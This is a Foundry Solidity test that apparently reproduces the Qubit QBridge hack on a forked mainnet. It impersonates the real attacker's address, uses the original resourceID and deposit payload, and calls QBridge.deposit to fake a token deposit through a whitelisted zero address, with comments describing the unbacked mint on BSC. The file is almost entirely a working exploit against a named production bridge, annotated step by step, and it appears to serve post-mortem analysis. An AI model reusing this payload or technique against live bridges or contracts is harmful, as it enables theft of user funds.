// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IQBridge {
    function deposit(uint8 destinationDomainID, bytes32 resourceID, bytes calldata data) external payable;
}

interface IQBridgeHandler {
    // mapping(address => bool) public contractWhitelist;
    function resourceIDToTokenContractAddress(
        bytes32
    ) external returns (address);
    function contractWhitelist(
        address
    ) external returns (bool);
    function deposit(bytes32 resourceID, address depositer, bytes calldata data) external;
}

// @VULNERABILITY: QBridgeHandler.deposit (sources/QBridgeHandler_80D148/contracts_bridge_QBridgeHandler.sol:122) resolves unknown resourceID to tokenAddress=address(0) via resourceIDToTokenContractAddress; require(contractWhitelist[tokenAddress]) passes because contractWhitelist[address(0)]==true (deployment state), then SafeToken.safeTransferFrom(0x0,...) succeeds as no-op call (low-level .call to non-contract returns success+empty), yet still emits Deposit and increments nonce on QBridge, authorizing unbacked mint on destination chain. No zero-address or registered-resource check.

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address attacker = 0xD01Ae1A708614948B2B5e0B7AB5be6AFA01325c7;
    address QBridge = 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6;
    address QBridgeHandler = 0x17B7163cf1Dbd286E262ddc68b553D899B93f526;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8545", 14_090_169); //fork mainnet at block 14090169
    }

    function testExploit() public {
        cheat.startPrank(attacker);
        // emit log_named_uint(
        //   "Before exploiting, attacker OP Balance:",
        //   op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)
        // );

        // @EXPLOIT_STEP 1: Impersonate the attacker EOA and select a resourceID that is registered in QBridge.resourceIDToHandlerAddress (so handler lookup passes) but was never registered via setResource on the handler, so handler.resourceIDToTokenContractAddress[resourceID] returns its default address(0).
        bytes32 resourceID = hex"00000000000000000000002f422fe9ea622049d6f73f81a906b9b8cff03b7f01";
        // @EXPLOIT_STEP 2: Craft the deposit data payload (option + amount) exactly as used in the real attack; this will be abi-decoded inside the handler's deposit() with no further validation.
        bytes memory data =
            hex"000000000000000000000000000000000000000000000000000000000000006900000000000000000000000000000000000000000000000a4cc799563c380000000000000000000000000000d01ae1a708614948b2b5e0b7ab5be6afa01325c7";
        uint256 option;
        uint256 amount;
        (option, amount) = abi.decode(data, (uint256, uint256));
        emit log_named_uint("option", option);
        emit log_named_uint("amount", amount);
        // which calls in turn:
        // IQBridgeHandler(QBridgeHandler).deposit(resourceID, attacker, data);
        // @EXPLOIT_STEP 3: Observe the two root defects at runtime: resource lookup yields 0x0, and the zero address is (incorrectly) whitelisted. This is only possible because of missing != address(0) guard + sentinel whitelist entry.
        emit log_named_address(
            "contractAddress", IQBridgeHandler(QBridgeHandler).resourceIDToTokenContractAddress(resourceID)
        );
        emit log_named_uint(
            "is 0 address whitelisted", IQBridgeHandler(QBridgeHandler).contractWhitelist(address(0)) ? 1 : 0
        );

        // @EXPLOIT_STEP 4: Call QBridge.deposit (paying the fee if non-zero). Bridge checks handler != address(0) for the resourceID (passes), then forwards to IQBridgeHandler(handler).deposit(resourceID, msg.sender, data) and will emit Deposit + bump nonce on success.
        IQBridge(QBridge).deposit(1, resourceID, data);
        // @EXPLOIT_STEP 5: Inside handler.deposit (the vulnerable path): tokenAddress=0 passes whitelist require, SafeToken.safeTransferFrom(0) performs a .call that returns (true, ""), requirement satisfied with no tokens moved and no revert. Deposit event + nonce increment recorded as if assets were locked.
        // @EXPLOIT_STEP 6: (off-chain) Relayers observe the legitimate-looking Deposit record on Ethereum and execute the corresponding mint on BSC via the handler's executeProposal path, delivering real (unbacked) tokens to the attacker. Net on-chain cost to attacker: ~0 (only bridge fee).

        // cheats.createSelectFork("http://127.0.0.1:8545", 14742311); //fork mainnet at block 14742311
    }

    receive() external payable {}
}
